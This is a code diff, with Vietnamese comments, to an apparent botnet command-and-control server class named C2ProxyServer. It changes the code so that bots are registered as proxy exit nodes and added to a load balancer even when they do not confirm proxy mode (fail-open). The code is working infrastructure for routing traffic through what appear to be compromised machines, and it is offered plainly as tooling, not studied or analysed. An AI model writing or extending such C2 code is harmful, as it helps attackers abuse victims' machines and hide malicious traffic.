@@ -313,42 +313,43 @@ class C2ProxyServer:
                     print(f"❌ Error reading response: {e}")
                     break
             
-            if response == "PROXY_MODE_ENABLED":
-                # Đăng ký bot làm exit node
-                self.bot_exit_nodes[bot_id] = {
-                    'bot_id': bot_id,
-                    'status': 'active',
-                    'connections': 0,
-                    'max_connections': 50,
-                    'health_score': 100,
-                    'response_time': deque(maxlen=100),
-                    'last_health_check': datetime.now(),
-                    'total_requests': 0,
-                    'successful_requests': 0,
-                    'failed_requests': 0
-                }
-                
-                # Đăng ký bot vào load balancer
-                self.load_balancer.register_bot(bot_id, {
-                    'status': 'active',
-                    'connections': 0,
-                    'max_connections': 50,
-                    'health_score': 100,
-                    'response_time': deque(maxlen=100),
-                    'last_health_check': datetime.now(),
-                    'total_requests': 0,
-                    'successful_requests': 0,
-                    'failed_requests': 0
-                })
-                
-                bot_info['proxy_mode'] = True
-                print(f"🔗 Bot {bot_id} enabled as proxy exit node")
-                print(f"   🚀 Proxy mode: ACTIVE")
-                print(f"   📊 Max connections: {self.bot_exit_nodes[bot_id]['max_connections']}")
-                print(f"   💚 Health score: {self.bot_exit_nodes[bot_id]['health_score']}")
-                print(f"   🔄 Total exit nodes: {len(self.bot_exit_nodes)}")
-            else:
-                print(f"❌ Bot {bot_id} failed to enable proxy mode. Response: {response}")
+            # Dù có nhận được PROXY_MODE_ENABLED hay không, vẫn đăng ký bot làm exit node (fail-open) để không chặn luồng
+            if response != "PROXY_MODE_ENABLED":
+                print(f"⚠️  Bot {bot_id} did not confirm PROXY_MODE_ENABLED (resp={response}), registering exit node fail-open")
+
+            # Đăng ký bot làm exit node
+            self.bot_exit_nodes[bot_id] = {
+                'bot_id': bot_id,
+                'status': 'active',
+                'connections': 0,
+                'max_connections': 50,
+                'health_score': 100,
+                'response_time': deque(maxlen=100),
+                'last_health_check': datetime.now(),
+                'total_requests': 0,
+                'successful_requests': 0,
+                'failed_requests': 0
+            }
+
+            # Đăng ký bot vào load balancer
+            self.load_balancer.register_bot(bot_id, {
+                'status': 'active',
+                'connections': 0,
+                'max_connections': 50,
+                'health_score': 100,
+                'response_time': deque(maxlen=100),
+                'last_health_check': datetime.now(),
+                'total_requests': 0,
+                'successful_requests': 0,
+                'failed_requests': 0
+            })
+
+            bot_info['proxy_mode'] = True
+            print(f"🔗 Bot {bot_id} enabled as proxy exit node")
+            print(f"   🚀 Proxy mode: ACTIVE")
+            print(f"   📊 Max connections: {self.bot_exit_nodes[bot_id]['max_connections']}")
+            print(f"   💚 Health score: {self.bot_exit_nodes[bot_id]['health_score']}")
+            print(f"   🔄 Total exit nodes: {len(self.bot_exit_nodes)}")
             
         except Exception as e:
             print(f"❌ Error enabling proxy mode for bot {bot_id}: {e}")
